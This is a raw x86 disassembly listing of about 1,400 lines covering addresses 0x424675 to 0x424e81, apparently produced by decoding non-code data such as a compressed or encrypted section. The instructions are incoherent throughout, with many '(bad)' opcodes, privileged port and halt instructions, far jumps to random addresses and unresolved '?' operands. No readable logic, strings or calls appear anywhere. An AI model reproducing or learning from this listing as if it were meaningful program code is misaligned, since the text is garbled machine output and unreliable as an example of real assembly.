  424675:	mov    ds:0xa2af0ff5,eax
  42467a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42467b:	jae    0x42465c
  42467d:	loop   0x4246c1
  42467f:	(bad)  [ebx+0x9f58c14]
  424685:	jl     0x42468e
  424687:	inc    ebx
  424688:	icebp  
  424689:	scas   al,BYTE PTR es:[edi]
  42468a:	ret    
  42468b:	sar    DWORD PTR [edx-0x664f7a4a],cl
  424691:	mov    edi,0xcf53f13a
  424696:	out    dx,eax
  424697:	add    BYTE PTR [edx],ch
  424699:	in     eax,0x8c
  42469b:	mov    BYTE PTR [eax],dl
  42469d:	rcr    BYTE PTR [ecx-0x5725416f],cl
  4246a3:	xchg   ecx,eax
  4246a4:	outs   dx,DWORD PTR ds:[esi]
  4246a5:	lods   eax,DWORD PTR ds:[esi]
  4246a6:	mov    al,ds:0xed7cd6e7
  4246ab:	retf   
  4246ac:	inc    BYTE PTR [edi-0x61]
  4246af:	test   bh,al
  4246b1:	push   0x4e
  4246b3:	out    0xbe,al
  4246b5:	adc    al,0x91
  4246b7:	mov    gs,WORD PTR [ebx+0xa]
  4246ba:	arpl   WORD PTR [eax+0x74],di
  4246bd:	push   es
  4246be:	into   
  4246bf:	iret   
  4246c0:	(bad)  
  4246c1:	aaa    
  4246c2:	mov    edi,0x5f99b2ef
  4246c7:	adc    al,0xbc
  4246ca:	mov    ds:0x5e97332d,eax
  4246cf:	push   0x7f
  4246d1:	add    eax,0xbcf01acb
  4246d6:	in     al,0x27
  4246d8:	and    BYTE PTR [esi-0x44],cl
  4246db:	sbb    al,0x7f
  4246dd:	test   DWORD PTR [ebx-0x70],edx
  4246e0:	imul   eax,DWORD PTR [esi+eax*2-0x7e],0xffffffed
  4246e5:	pop    ebx
  4246e6:	jb     0x424685
  4246e8:	mov    esp,0x90b24ccd
  4246ed:	les    ecx,FWORD PTR [ebx+0x3e]
  4246f0:	fs jmp ebp
  4246f3:	mov    ebp,0xc9fc4d69
  4246f8:	sub    edi,DWORD PTR [esi]
  4246fa:	rol    BYTE PTR [ebp-0x4213d2a9],cl
  424700:	pop    edi
  424701:	or     dh,BYTE PTR [edi+0x78af2ce2]
  424707:	xchg   edi,eax
  424708:	add    al,0xe3
  42470a:	push   DWORD PTR [eax]
  42470c:	jb     0x4246c5
  42470e:	xlat   BYTE PTR ds:[ebx]
  42470f:	scas   eax,DWORD PTR es:[edi]
  424710:	mov    dl,0xe
  424712:	imul   esp,esp,0x3
  424715:	jle    0x4246bb
  424717:	dec    ebp
  424718:	mov    ah,0xaf
  42471a:	sbb    al,0x49
  42471c:	ja     0x4246a1
  42471e:	lods   al,BYTE PTR ds:[esi]
  42471f:	pop    ss
  424720:	lahf   
  424721:	fisub  DWORD PTR [edx-0x3a]
  424724:	retf   
  424725:	inc    esp
  424726:	or     edi,DWORD PTR [edi-0x3904ddb9]
  42472c:	sbb    al,0x7f
  42472e:	mov    al,0xc6
  424730:	lods   eax,DWORD PTR ds:[esi]
  424731:	add    eax,0xe8fedd25
  424736:	rol    DWORD PTR [ecx+edi*8-0x53f675dd],1
  42473d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42473e:	inc    edi
  42473f:	xchg   ebx,eax
  424740:	adc    bl,ch
  424742:	dec    ebx
  424743:	or     eax,0xc82652fc
  424748:	lds    ebx,FWORD PTR fs:[eax+0x566dfb81]
  42474f:	or     DWORD PTR [ecx-0xd],edi
  424752:	aaa    
  424753:	shr    BYTE PTR [edi+0x52d4ca40],0x47
  42475a:	dec    esp
  42475b:	jae    0x424787
  42475d:	adc    al,0x6b
  42475f:	out    dx,al
  424760:	or     DWORD PTR [edi-0x4bff262a],0xffffffb2
  424767:	sub    BYTE PTR ss:[ecx+0x5f2728e],0x4e
  42476f:	sub    al,0x94
  424771:	rcl    BYTE PTR [edx+0x78d6e407],cl
  424777:	sbb    ecx,esi
  424779:	jg     0x4247b1
  42477b:	add    ebx,DWORD PTR [edx+0x4a82b15c]
  424781:	retfw  0x921a
  424785:	fwait
  424786:	fwait
  424787:	inc    esp
  424788:	adc    BYTE PTR [ebx+0x245ee1c3],ch
  42478e:	lahf   
  42478f:	pop    ss
  424790:	iret   
  424791:	adc    ebp,DWORD PTR [edx+0x43]
  424794:	or     BYTE PTR [esi+0x5337bded],cl
  42479a:	les    ebx,FWORD PTR [eax]
  42479c:	and    al,0x15
  42479e:	or     al,0xa6
  4247a0:	leave  
  4247a1:	adc    DWORD PTR [eax-0x256db4f6],edi
  4247a7:	nop
  4247a8:	adc    BYTE PTR [ecx+0x75e90a6],ah
  4247ae:	dec    edi
  4247af:	sub    BYTE PTR [edx],bh
  4247b1:	repnz test eax,0xd4cbc542
  4247b7:	or     BYTE PTR [ebx],bh
  4247b9:	mov    bl,BYTE PTR [eax+0x6ee6b612]
  4247bf:	mov    BYTE PTR [edi+ebx*1],ah
  4247c2:	push   ds
  4247c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247c4:	adc    cl,BYTE PTR [ecx+0x4e6b3bb1]
  4247ca:	dec    ecx
  4247cb:	inc    esi
  4247cc:	dec    ebx
  4247cd:	add    al,0x6a
  4247cf:	jmp    0x424796
  4247d1:	dec    edx
  4247d2:	bound  eax,QWORD PTR [esi-0x7b]
  4247d5:	jns    0x4247f3
  4247d7:	repz cmc 
  4247d9:	test   al,0x4b
  4247db:	cli    
  4247dc:	push   esp
  4247dd:	mov    al,ds:0x79b4d4fc
  4247e2:	iret   
  4247e3:	or     eax,0xc8c70173
  4247e8:	sbb    al,0x38
  4247ea:	and    ah,BYTE PTR [edi]
  4247ec:	sub    eax,0xfc2057f8
  4247f1:	(bad)  
  4247f2:	loopne 0x424812
  4247f4:	mov    al,0x67
  4247f6:	fidiv  WORD PTR ds:0x94f63eb4
  4247fc:	lods   eax,DWORD PTR ds:[esi]
  4247fd:	dec    esp
  4247fe:	fsub   DWORD PTR [ecx-0x396a1bf5]
  424804:	(bad)  
  424805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424806:	mov    eax,DWORD PTR [esi]
  424808:	ret    0xdd58
  42480b:	mov    ds:0xe2ff6e8b,eax
  424810:	jns    0x424809
  424812:	add    esp,DWORD PTR [eax]
  424814:	or     BYTE PTR [ebx-0x6ce92acb],ah
  42481a:	out    0xf7,eax
  42481c:	icebp  
  42481d:	dec    ebx
  42481e:	xor    BYTE PTR [ebp+0x2a],dl
  424821:	and    DWORD PTR [ecx+edi*2+0x8f472f7],ebp
  424828:	cdq    
  424829:	add    al,0x25
  42482b:	xchg   BYTE PTR [ebx+0x6b],dl
  42482e:	mul    BYTE PTR [ecx+0x1e2161cf]
  424834:	xor    dh,BYTE PTR [ebp-0x1c]
  424837:	sar    DWORD PTR ds:0xcb74690,cl
  42483d:	je     0x4247c0
  42483f:	loop   0x4247cf
  424841:	xor    eax,0x7ac4e34
  424846:	cmp    ch,BYTE PTR [eax-0xd0768b4]
  42484c:	mov    WORD PTR [edx+0x59],?
  42484f:	xchg   BYTE PTR [edi-0x39],ah
  424852:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424853:	fwait
  424854:	push   esp
  424855:	in     al,0x39
  424857:	jge    0x424893
  424859:	pop    edi
  42485a:	push   ebx
  42485b:	jbe    0x4248c8
  42485d:	push   es
  42485e:	or     ebp,edi
  424860:	xor    DWORD PTR ds:0x4558af43,ebx
  424866:	nop
  424867:	add    al,0x46
  424869:	sub    ecx,DWORD PTR [edx]
  42486b:	aaa    
  42486c:	add    esi,DWORD PTR [eax+0x679046c9]
  424872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424873:	xchg   esp,eax
  424874:	fnstenv [ebp+0x3e]
  424877:	pop    ebx
  424878:	test   eax,0x455f3e61
  42487d:	xchg   DWORD PTR [ebx+eiz*2+0x4ab99807],edi
  424884:	xor    BYTE PTR [ebx-0x6d50375c],al
  42488a:	sysenter 
  42488c:	jge    0x4248df
  42488e:	aaa    
  42488f:	push   ds
  424890:	xor    BYTE PTR [ebx],dh
  424892:	xor    edi,DWORD PTR [esi*2+0x3c88bcd4]
  424899:	retf   0x3b6a
  42489c:	fmulp  st(5),st
  42489e:	xchg   ecx,eax
  42489f:	nop
  4248a0:	mov    edi,0xef200aee
  4248a5:	push   0xffffff9c
  4248a7:	sbb    ebx,DWORD PTR [ebp-0x68]
  4248aa:	enter  0xb150,0x77
  4248ae:	push   ss
  4248af:	add    eax,0xb568c043
  4248b4:	mov    al,ds:0x16457a81
  4248b9:	idiv   BYTE PTR [ebx+0x685a5cd3]
  4248bf:	mov    cs,WORD PTR [edi+0x34eb1cbe]
  4248c5:	int3   
  4248c6:	lods   al,BYTE PTR ds:[esi]
  4248c7:	pushf  
  4248c8:	pop    ecx
  4248c9:	xchg   DWORD PTR [edx],edx
  4248cb:	mov    ds:0xd5677b39,al
  4248d0:	lahf   
  4248d1:	(bad)  [esi+0x6a]
  4248d4:	rol    BYTE PTR [ebx+0x2a],cl
  4248d7:	int    0x7a
  4248d9:	loopne 0x42490f
  4248db:	jo     0x4248e9
  4248dd:	push   eax
  4248de:	rcr    DWORD PTR [ebx-0x46ba9cbb],0x63
  4248e5:	pop    DWORD PTR [edi+0x2dcdaf4f]
  4248eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248ec:	cli    
  4248ed:	jmp    0x2acd073d
  4248f2:	les    ebp,FWORD PTR [ebx]
  4248f4:	xchg   ecx,eax
  4248f5:	xchg   edi,eax
  4248f6:	inc    edx
  4248f7:	push   si
  4248f9:	mov    BYTE PTR [eax-0x7e1be148],ch
  4248ff:	push   ecx
  424900:	dec    edi
  424901:	iret   
  424902:	sbb    al,0xf9
  424904:	sbb    esi,esi
  424906:	dec    edx
  424907:	sahf   
  424908:	add    esi,DWORD PTR [edi+0xf]
  42490b:	imul   eax,esp,0xffffffa3
  42490e:	xchg   edx,eax
  42490f:	clc    
  424910:	adc    al,0xf6
  424912:	inc    esp
  424913:	cdq    
  424914:	mov    dl,0xb0
  424916:	mov    eax,ds:0x1e7421ba
  42491b:	dec    ebp
  42491c:	(bad)  
  42491e:	sbb    BYTE PTR [ebp-0x1c],bl
  424921:	in     al,0x4
  424923:	adc    DWORD PTR [ebx-0x4da4a477],edx
  424929:	sub    eax,0xf9ebdc61
  42492e:	lods   eax,DWORD PTR ds:[esi]
  42492f:	dec    edi
  424930:	jno    0x4248f9
  424932:	hlt    
  424933:	dec    ebp
  424934:	sub    ecx,edx
  424936:	arpl   WORD PTR [esi-0x7498ebd],bx
  42493c:	scas   al,BYTE PTR es:[edi]
  42493d:	xor    eax,0x6ff66b2e
  424942:	cmc    
  424943:	or     esp,0xffffff92
  424946:	jmp    0x89fc:0x614a98d7
  42494d:	je     0x4249be
  42494f:	cwde   
  424950:	sub    ah,BYTE PTR [edx]
  424952:	aaa    
  424953:	stos   DWORD PTR es:[edi],eax
  424954:	stc    
  424955:	pop    edx
  424956:	adc    edx,DWORD PTR [ebx-0x1e]
  424959:	xlat   BYTE PTR ds:[ebx]
  42495a:	popf   
  42495b:	fucomip st,st(6)
  42495d:	cwde   
  42495e:	in     eax,dx
  42495f:	dec    ecx
  424960:	or     esp,0x43ae7c6a
  424966:	lea    esi,[esp+ebp*1-0x40]
  42496a:	jp     0x42493d
  42496c:	push   esp
  42496d:	pusha  
  42496e:	lds    ecx,FWORD PTR [edx+0x49]
  424971:	sub    eax,DWORD PTR ds:0x6e3fd938
  424977:	xrelease mov BYTE PTR [ecx-0x44],ah
  42497b:	or     esp,0x2c
  42497e:	adc    bh,BYTE PTR ds:0xaf41ef97
  424984:	jno    0x4249df
  424986:	(bad)  
  424987:	sub    al,0xc8
  424989:	cli    
  42498a:	nop
  42498b:	cli    
  42498c:	das    
  42498d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42498e:	out    0x96,eax
  424990:	jecxz  0x42493f
  424992:	xchg   ecx,eax
  424993:	and    DWORD PTR [edi+edx*1-0x6d2d8ab5],edx
  42499a:	fwait
  42499b:	addr16 push 0xffffff8e
  42499e:	push   edx
  42499f:	mul    DWORD PTR [esi+0x7f]
  4249a2:	out    dx,al
  4249a3:	js     0x424939
  4249a5:	lahf   
  4249a6:	adc    al,0xdd
  4249a8:	inc    ebx
  4249a9:	mov    ebx,ss
  4249ab:	test   al,0x33
  4249ad:	pop    ebx
  4249ae:	dec    eax
  4249af:	shl    DWORD PTR es:[ecx+0x28],cl
  4249b3:	in     eax,0xd3
  4249b5:	add    al,0x0
  4249b7:	scas   al,BYTE PTR es:[edi]
  4249b8:	repnz cld 
  4249ba:	aaa    
  4249bb:	in     al,0x8c
  4249bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249be:	mov    edi,0x1b85dc7f
  4249c3:	cs xchg esi,eax
  4249c5:	inc    esp
  4249c6:	fisttp WORD PTR [edi]
  4249c8:	fimul  WORD PTR [edx+esi*8+0x64]
  4249cc:	clc    
  4249cd:	pop    edi
  4249ce:	sbb    BYTE PTR ds:0x5d1b32a7,bl
  4249d4:	or     ch,dl
  4249d6:	push   edi
  4249d7:	inc    ecx
  4249d8:	cmc    
  4249d9:	ja     0x42497f
  4249db:	adc    cl,BYTE PTR [esp+0xf]
  4249df:	adc    edi,0xb29da18b
  4249e5:	test   esp,ebp
  4249e7:	or     DWORD PTR [edi-0x389eedc6],0x76
  4249ee:	adc    eax,0x5eef2563
  4249f3:	test   edx,esi
  4249f5:	aas    
  4249f6:	or     al,0x6
  4249f8:	push   edx
  4249f9:	outs   dx,DWORD PTR ds:[esi]
  4249fa:	push   es
  4249fb:	push   ss
  4249fc:	adc    eax,0x7fb933a5
  424a01:	xchg   esi,eax
  424a02:	sub    esp,DWORD PTR [esp-0x6b]
  424a06:	cmp    eax,0x1d312fa1
  424a0b:	mov    ebp,0xa329738c
  424a10:	bnd gs ja 0x4249a6
  424a14:	mov    bh,0x25
  424a16:	stc    
  424a17:	dec    edi
  424a18:	cs xchg ebx,eax
  424a1a:	jo     0x424a5e
  424a1c:	leave  
  424a1d:	and    ch,BYTE PTR [edx]
  424a1f:	fsubr  DWORD PTR [ebx+0x45]
  424a22:	fdivr  st,st(0)
  424a24:	andnps xmm6,XMMWORD PTR [edx+0x54]
  424a28:	xchg   esp,eax
  424a29:	xchg   ebx,eax
  424a2a:	xchg   ecx,eax
  424a2b:	mov    esp,0x4ea2a2a2
  424a30:	mov    ah,0xb2
  424a32:	stos   BYTE PTR es:[edi],al
  424a33:	mov    ah,0xd
  424a35:	leave  
  424a36:	push   edi
  424a37:	inc    esp
  424a38:	shl    DWORD PTR [eax+edx*2-0x731ef911],cl
  424a3f:	movzx  esi,BYTE PTR [ecx+0x38a7524f]
  424a46:	push   eax
  424a47:	inc    ebx
  424a48:	mov    WORD PTR [eax-0x7a],ss
  424a4b:	mov    bh,0x3d
  424a4d:	ins    DWORD PTR es:[edi],dx
  424a4e:	push   edx
  424a4f:	out    0xd1,eax
  424a51:	je     0x424ab4
  424a53:	sub    eax,0xe831bfa9
  424a58:	pop    ds
  424a59:	sti    
  424a5a:	jo     0x424a78
  424a5c:	in     eax,dx
  424a5d:	sub    dh,BYTE PTR ds:0xa9e1127a
  424a63:	clc    
  424a64:	retf   0x6c23
  424a67:	repz mov al,ds:0x88b2da59
  424a6d:	sub    eax,0xa11138b
  424a72:	pusha  
  424a73:	or     BYTE PTR [edx],bh
  424a75:	xchg   ebx,eax
  424a76:	jecxz  0x424a27
  424a78:	push   esi
  424a79:	(bad)  
  424a7a:	adc    cl,dl
  424a7c:	xchg   ebx,eax
  424a7d:	pop    es
  424a7e:	add    al,0x3f
  424a80:	fnstsw WORD PTR [esi+0x609e6428]
  424a86:	pushf  
  424a87:	inc    ebp
  424a88:	xchg   esp,eax
  424a89:	sti    
  424a8a:	retf   
  424a8b:	cdq    
  424a8c:	add    eax,0x2528e7ce
  424a91:	repz imul esp,DWORD PTR [ecx],0x20d86b26
  424a98:	scas   al,BYTE PTR es:[edi]
  424a99:	gs aas 
  424a9b:	hlt    
  424a9c:	fcomp  DWORD PTR [ecx+0x5e]
  424a9f:	rcl    DWORD PTR [ecx],0xc
  424aa2:	jge    0x424a37
  424aa4:	ret    
  424aa5:	cmp    BYTE PTR [eax],al
  424aa7:	add    dh,BYTE PTR [edi]
  424aa9:	loope  0x424a42
  424aab:	jle    0x424a47
  424aad:	in     eax,0x2a
  424aaf:	or     eax,0x23d05264
  424ab4:	pop    ebp
  424ab5:	push   ds
  424ab6:	push   0xffffffeb
  424ab8:	pop    edx
  424ab9:	fadd   QWORD PTR [edi+0x4b]
  424abc:	jmp    0x424a72
  424abe:	adc    ebp,esp
  424ac0:	fdiv   DWORD PTR [esp+eiz*4]
  424ac3:	sub    al,0x66
  424ac5:	(bad)  
  424ac6:	mov    ecx,0xd53e37eb
  424acb:	cmp    esi,edi
  424acd:	mov    edx,DWORD PTR [ebx]
  424acf:	loopne 0x424aae
  424ad1:	pusha  
  424ad2:	lods   eax,DWORD PTR ds:[esi]
  424ad3:	sbb    edi,ebx
  424ad5:	fdivr  QWORD PTR [ebx]
  424ad7:	pop    ecx
  424ad8:	in     eax,dx
  424ad9:	iret   
  424ada:	mov    esi,0x1d77e888
  424adf:	mov    ah,0xd2
  424ae1:	jmp    0x7782:0x8d4aca07
  424ae8:	inc    ebx
  424ae9:	stc    
  424aea:	inc    edx
  424aeb:	inc    ecx
  424aec:	in     eax,0xc0
  424aee:	push   ebp
  424aef:	xchg   ebp,eax
  424af0:	cdq    
  424af1:	pop    esp
  424af2:	dec    eax
  424af3:	or     DWORD PTR [ebx+ebp*2-0x7a2deef4],ebx
  424afa:	lods   eax,DWORD PTR ds:[esi]
  424afb:	out    0x40,eax
  424afd:	mov    esi,0x700e10e5
  424b02:	ror    BYTE PTR [esi-0x49f55c39],1
  424b08:	xchg   ebx,eax
  424b09:	sbb    DWORD PTR [ebx-0x14],edi
  424b0c:	in     eax,dx
  424b0d:	test   DWORD PTR [ebp+0x2ca38e7f],ebx
  424b13:	sahf   
  424b14:	fwait
  424b15:	addr16 inc ebp
  424b17:	jo     0x424ab0
  424b19:	add    al,0x5a
  424b1b:	push   ds
  424b1c:	mov    ebp,0xc9565dd7
  424b21:	and    edi,DWORD PTR [edi+0x8]
  424b24:	hlt    
  424b25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b26:	sbb    bh,0x4d
  424b29:	and    ecx,DWORD PTR [edi]
  424b2b:	scas   eax,DWORD PTR es:[edi]
  424b2c:	jbe    0x424ba2
  424b2e:	fdiv   DWORD PTR [eax+0x67]
  424b31:	and    DWORD PTR [esi+0x3b],ebx
  424b34:	pop    ds
  424b35:	call   0xeba314d8
  424b3a:	(bad)  
  424b3b:	aaa    
  424b3c:	jb     0x424b03
  424b3e:	imul   ebp,DWORD PTR [esi+0x3e338d34],0x70
  424b45:	xchg   edx,eax
  424b46:	sbb    al,BYTE PTR [edx]
  424b48:	data16 outs dx,BYTE PTR ds:[esi]
  424b4a:	inc    ebp
  424b4b:	fidivr WORD PTR [edx+0x6c]
  424b4e:	or     DWORD PTR [esi+0x125cdc02],esp
  424b54:	(bad)  
  424b55:	jmp    FWORD PTR [esi+0x6a]
  424b58:	and    DWORD PTR [ebx],ebx
  424b5a:	add    bl,0x87
  424b5d:	lods   al,BYTE PTR ds:[esi]
  424b5e:	aaa    
  424b5f:	jb     0x424b7d
  424b61:	(bad)  
  424b62:	sar    DWORD PTR [edx+0x5505c15c],cl
  424b68:	push   ecx
  424b69:	jmp    0x424b21
  424b6b:	icebp  
  424b6c:	xor    edi,DWORD PTR [eax]
  424b6e:	(bad)  
  424b6f:	sahf   
  424b70:	or     eax,0x626b4ea9
  424b75:	pop    es
  424b76:	jl     0x424b37
  424b78:	mov    dh,0xce
  424b7b:	push   ecx
  424b7c:	or     eax,0xea9aa97d
  424b81:	xor    al,0x96
  424b83:	and    esp,DWORD PTR [ebx-0x53]
  424b86:	(bad)  
  424b88:	push   ebp
  424b89:	jle    0x424b57
  424b8b:	push   ebp
  424b8c:	shl    BYTE PTR [eax],0x6a
  424b8f:	mov    al,ds:0x307df1cd
  424b94:	int3   
  424b95:	dec    ecx
  424b96:	and    BYTE PTR [edi-0x1815a9f7],bh
  424b9c:	mov    ?,WORD PTR [edx+0x16cc2043]
  424ba2:	pop    esp
  424ba3:	shl    BYTE PTR [eax-0x3f86acca],1
  424ba9:	pop    edx
  424baa:	jecxz  0x424bc6
  424bac:	xor    DWORD PTR [esi+0x15],edx
  424baf:	push   es
  424bb0:	and    eax,0xd7c4caff
  424bb5:	sbb    al,0x95
  424bb7:	xor    esi,DWORD PTR [edx+0x39]
  424bba:	mov    bl,0x3a
  424bbc:	call   0x4c124660
  424bc1:	sub    al,0xd4
  424bc3:	mov    WORD PTR [ebx+0x75ab27b5],ds
  424bc9:	or     bl,bl
  424bcb:	xor    DWORD PTR [edx+0x6a8312c8],esp
  424bd1:	mov    esp,0x8fce1f52
  424bd6:	repnz ins BYTE PTR es:[edi],dx
  424bd8:	test   DWORD PTR [ecx+0xaaa2af2],0x89f9fe6
  424be2:	or     eax,0xbafa6c24
  424be7:	fs cdq 
  424be9:	push   esp
  424bea:	js     0x424bc6
  424bec:	test   BYTE PTR [ecx],cl
  424bee:	cs aaa 
  424bf0:	ins    BYTE PTR es:[edi],dx
  424bf1:	in     eax,0x95
  424bf3:	fstp   TBYTE PTR gs:[ebp+0x68]
  424bf7:	adc    ebx,DWORD PTR [edx+0x52471dac]
  424bfd:	mov    ds:0xa35a3463,al
  424c02:	rcl    DWORD PTR [esp+eax*4-0x6a49e99d],cl
  424c09:	dec    ecx
  424c0a:	stc    
  424c0b:	push   esi
  424c0c:	mov    eax,0x124cfa7
  424c11:	ss popa 
  424c13:	cmp    edi,ecx
  424c15:	rep lods al,BYTE PTR ds:[esi]
  424c17:	xchg   ecx,eax
  424c18:	enterw 0xe2d6,0xab
  424c1d:	adc    eax,0x83ce72ac
  424c22:	bound  eax,QWORD PTR [ebx+eiz*1]
  424c25:	adc    edx,DWORD PTR ss:[eax]
  424c28:	pop    ebp
  424c29:	mov    edx,0xd6344b6
  424c2e:	mov    ds:0x610b04af,eax
  424c33:	cdq    
  424c34:	(bad)  
  424c35:	dec    ebx
  424c36:	mov    ch,0x9c
  424c38:	sub    BYTE PTR [ebx-0x2f],dh
  424c3b:	cwde   
  424c3c:	fstp   TBYTE PTR [edi]
  424c3e:	outs   dx,DWORD PTR ds:[esi]
  424c3f:	xchg   ebx,eax
  424c40:	scas   eax,DWORD PTR es:[edi]
  424c41:	(bad)  
  424c43:	jo     0x424bea
  424c45:	test   DWORD PTR [esi-0x66d1dd07],edx
  424c4b:	ins    DWORD PTR es:[edi],dx
  424c4c:	add    al,0x62
  424c4e:	push   ss
  424c4f:	rol    DWORD PTR [esi+eax*8],cl
  424c52:	mov    dh,BYTE PTR [eax+edx*1]
  424c55:	ret    0x86f
  424c58:	clc    
  424c59:	ss stos DWORD PTR es:[edi],eax
  424c5b:	inc    edi
  424c5c:	iret   
  424c5d:	push   es
  424c5e:	cmc    
  424c5f:	cli    
  424c60:	dec    esi
  424c61:	je     0x424c5a
  424c63:	je     0x424cd3
  424c65:	inc    esi
  424c66:	mov    cl,0xab
  424c68:	pop    esp
  424c69:	out    0xe4,al
  424c6b:	nop
  424c6c:	lahf   
  424c6d:	push   esi
  424c6e:	dec    edx
  424c6f:	jbe    0x424ca0
  424c71:	lds    edx,FWORD PTR [edi+0x5faebf30]
  424c77:	pop    edx
  424c78:	mov    ch,0xc1
  424c7a:	jmp    0x386d2fd4
  424c7f:	cmp    DWORD PTR [edx-0x1b],ebp
  424c82:	mov    bh,0xf
  424c84:	mov    ebp,0x4f26b6f8
  424c89:	pusha  
  424c8a:	mov    ebp,0xdbf8bed2
  424c8f:	mov    esi,fs
  424c91:	push   ecx
  424c92:	mov    al,BYTE PTR [esi+0x31be6d49]
	...
  424d14:	scas   eax,DWORD PTR es:[edi]
  424d15:	ror    esp,1
  424d17:	push   esp
  424d18:	(bad)  
  424d19:	pop    ebp
  424d1a:	mov    edi,0x5e13fbfb
  424d1f:	cmp    DWORD PTR [ebx+0x19],edi
  424d22:	push   edx
  424d23:	pop    ecx
  424d24:	mov    cl,0xe0
  424d26:	add    DWORD PTR [eax],eax
  424d28:	ins    BYTE PTR es:[edi],dx
  424d29:	pop    es
  424d2a:	add    BYTE PTR [eax],al
  424d2c:	add    bh,BYTE PTR [eax-0x1]
  424d2f:	outs   dx,BYTE PTR ds:[esi]
  424d30:	xor    dh,dl
  424d32:	pop    es
  424d33:	jne    0x424d1f
  424d35:	lods   al,BYTE PTR ds:[esi]
  424d36:	sbb    BYTE PTR [ebp-0x2f],0x80
  424d3a:	bound  ebx,QWORD PTR [eax+ebx*1-0x7c687ae3]
  424d41:	test   BYTE PTR gs:[esi],bh
  424d44:	add    eax,0x57a7d746
  424d49:	adc    al,BYTE PTR ds:[edi+0x41aa03ef]
  424d50:	outs   dx,DWORD PTR ds:[esi]
  424d51:	lods   eax,DWORD PTR ds:[esi]
  424d52:	dec    ecx
  424d53:	adc    BYTE PTR [esi+0x55],0x60
  424d57:	into   
  424d58:	aaa    
  424d59:	pop    ecx
  424d5a:	cmp    al,0x28
  424d5c:	cwde   
  424d5d:	sub    eax,0x6c7d4129
  424d62:	inc    esp
  424d63:	push   esi
  424d64:	jbe    0x424d2a
  424d66:	adc    edi,DWORD PTR [ecx-0x7c]
  424d69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d6a:	xlat   BYTE PTR ds:[ebx]
  424d6b:	push   0x4a0d8337
  424d70:	add    DWORD PTR [ecx-0x2f22379],esp
  424d76:	out    dx,al
  424d77:	xchg   edi,eax
  424d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d79:	mov    eax,0xf8dfebb4
  424d7e:	sbb    al,al
  424d80:	push   ds
  424d81:	xlat   BYTE PTR ds:[ebx]
  424d82:	pop    ebp
  424d83:	ss add dh,al
  424d86:	sub    eax,0xea7235cc
  424d8b:	gs cdq 
  424d8d:	sub    dh,BYTE PTR [esi+0x7e]
  424d90:	fnstenv [eax+0x75]
  424d93:	or     ah,BYTE PTR [ebp-0x4af63c49]
  424d99:	cwde   
  424d9a:	test   DWORD PTR [ebp-0x56],edi
  424d9d:	sbb    ebx,DWORD PTR [ebp+0x4104ecf]
  424da3:	mov    ah,0x46
  424da5:	and    DWORD PTR [edi+0x4a1906d5],edx
  424dab:	xchg   BYTE PTR [eax-0x5fb0c50a],al
  424db1:	adc    DWORD PTR [esi+0x2d],0xd9b9b4f8
  424db8:	xor    edi,DWORD PTR [edx+0x11]
  424dbb:	or     edx,DWORD PTR [edx+esi*2+0x9]
  424dbf:	dec    ebx
  424dc0:	push   ss
  424dc1:	sahf   
  424dc2:	cmp    DWORD PTR [esi+0x32061d11],edx
  424dc8:	add    DWORD PTR [edi],ecx
  424dca:	push   edx
  424dcb:	lds    ecx,FWORD PTR [edx-0x6357da9]
  424dd1:	sub    edi,DWORD PTR [edi]
  424dd3:	adc    edi,edi
  424dd5:	lods   eax,DWORD PTR ds:[esi]
  424dd6:	add    eax,0x928e79f7
  424ddb:	mov    cl,0x22
  424ddd:	das    
  424dde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ddf:	popa   
  424de0:	jae    0x424e5e
  424de2:	fsub   st,st(6)
  424de4:	mov    ah,0xe
  424de6:	pop    ds
  424de7:	out    dx,eax
  424de8:	bound  esi,QWORD PTR [ecx-0x2b]
  424deb:	adc    dl,BYTE PTR [eax+0x57]
  424dee:	add    ebp,DWORD PTR [ecx]
  424df0:	jbe    0x424d89
  424df2:	dec    ecx
  424df3:	sbb    eax,0xc60019b5
  424df8:	push   edi
  424df9:	mov    ah,0x48
  424dfb:	ret    0x3ac4
  424dfe:	out    0x9c,eax
  424e00:	stc    
  424e01:	push   ecx
  424e02:	lods   eax,DWORD PTR ds:[esi]
  424e03:	les    edi,FWORD PTR [ebx+0x45d9d3c9]
  424e09:	loop   0x424e5f
  424e0b:	dec    ecx
  424e0c:	add    al,0xe3
  424e0e:	sub    ch,dl
  424e10:	in     eax,dx
  424e11:	and    DWORD PTR [edi-0x50],esi
  424e14:	ficomp WORD PTR [ebp-0x77]
  424e17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424e18:	les    ebp,FWORD PTR [edi-0x6744d0f9]
  424e1e:	pop    es
  424e1f:	adc    ecx,ebx
  424e21:	xchg   dl,dl
  424e23:	mov    dl,0x7a
  424e25:	cmp    DWORD PTR [ecx],0x878e93c
  424e2b:	xor    eax,0x3c5a425a
  424e30:	leave  
  424e31:	stc    
  424e32:	mov    ch,0x62
  424e34:	aam    0xd8
  424e36:	xor    eax,0xe5872f91
  424e3b:	xor    DWORD PTR [eax-0x1b],ebp
  424e3e:	adc    BYTE PTR [esi+0x7a7fa466],bh
  424e44:	mov    esi,0x66f43cb1
  424e49:	sub    BYTE PTR [ebx-0x22ae58f3],cl
  424e4f:	push   ecx
  424e50:	push   DWORD PTR [eax]
  424e52:	aam    0xef
  424e54:	test   eax,0xc82873be
  424e59:	and    dl,ch
  424e5b:	mov    edi,0xc61180cb
  424e60:	cmp    BYTE PTR [ecx-0x25652eb0],0x11
  424e67:	pushf  
  424e68:	sbb    eax,0xdd25c361
  424e6d:	sar    DWORD PTR [edx-0x2926010d],0x89
  424e74:	aam    0x84
  424e76:	adc    esp,DWORD PTR ds:0x9329f1a1
  424e7c:	xchg   DWORD PTR [edi],edx
  424e7e:	retf   0xf868
  424e81:	lods   al,BYTE PTR ds:[esi]
